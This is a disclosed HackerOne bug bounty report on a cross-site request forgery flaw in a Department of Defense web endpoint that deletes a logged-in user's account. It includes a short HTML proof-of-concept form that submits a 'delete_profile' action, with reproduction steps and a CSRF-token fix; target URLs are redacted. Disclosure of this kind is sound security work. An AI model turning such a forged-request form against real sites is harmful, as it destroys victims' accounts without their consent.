# CSRF - Delete Account (Urgent)

## Report Details
- **Report ID**: 799855
- **URL**: https://hackerone.com/reports/799855
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-19T15:22:59.283Z
- **Disclosed**: 2022-03-18T18:59:20.224Z

## Reporter
- **Username**: ahmd_halabi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Target Url**
https://██████████/███/██████/█████████

**Summary:**
Hello, I found a Cross Site Request Forgery bug in the target endpoint on the GET request `████` which is critical because it can delete authenticated user account whenever he navigates to the attacker website or link.

## Step-by-step Reproduction Instructions

1. Navigate to your account in `https://█████████/████/`
2. Copy and paste the below code in an html file
```
<html>
  <body>
    <form action="https://████/████/███/">
      <input type="hidden" name="action" value="delete&#95;profile" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
3. Open it in the browser, hit the button and your account will be deactivated.

## Suggested Mitigation/Remediation Actions
Add a csrf-token in the header or in an hidden input to check if the user that is doing this action authorized or not.

## Impact

This action is critical and sensitive. Attacker can upload this file to a url. Sends it to the victims. And when the authenticated victims navigate to the url their accounts will be deleted.

## Attachments
No attachments
